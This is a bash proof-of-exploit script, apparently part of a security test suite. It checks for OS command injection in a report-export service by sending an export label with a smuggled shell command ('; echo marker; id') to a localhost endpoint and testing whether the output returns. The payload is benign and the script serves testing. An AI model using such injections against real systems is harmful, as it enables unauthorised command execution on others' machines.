#!/usr/bin/env bash
set -euo pipefail
# LG-CMDI-001 proof-of-exploit: OS command injection via the SAS report-export label. Sends an
# export label with a shell metacharacter to the SAS service's /export; fires (exit 0) when the
# injected `id` runs and its output (uid=...) comes back -- only possible with report_archive=on.
# Hits the SAS service directly on its published port. Env: SAS_URL (default http://localhost:8084).

SAS_URL="${SAS_URL:-http://localhost:8084}"
MARK="LGCMDI$$"

resp="$(curl -sS -X POST "$SAS_URL/export" -H 'content-type: application/json' \
  -d "{\"export_label\":\"rpt.lst; echo $MARK; id\"}")"

out="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("output",""))' <<<"$resp")"

if printf '%s' "$out" | grep -q "$MARK" && printf '%s' "$out" | grep -q "uid="; then
  echo "LG-CMDI-001 FIRED: injected command ran -> $(printf '%s' "$out" | tr '\n' ' ')"
  exit 0
fi
echo "LG-CMDI-001 not fired: $resp" >&2
exit 1
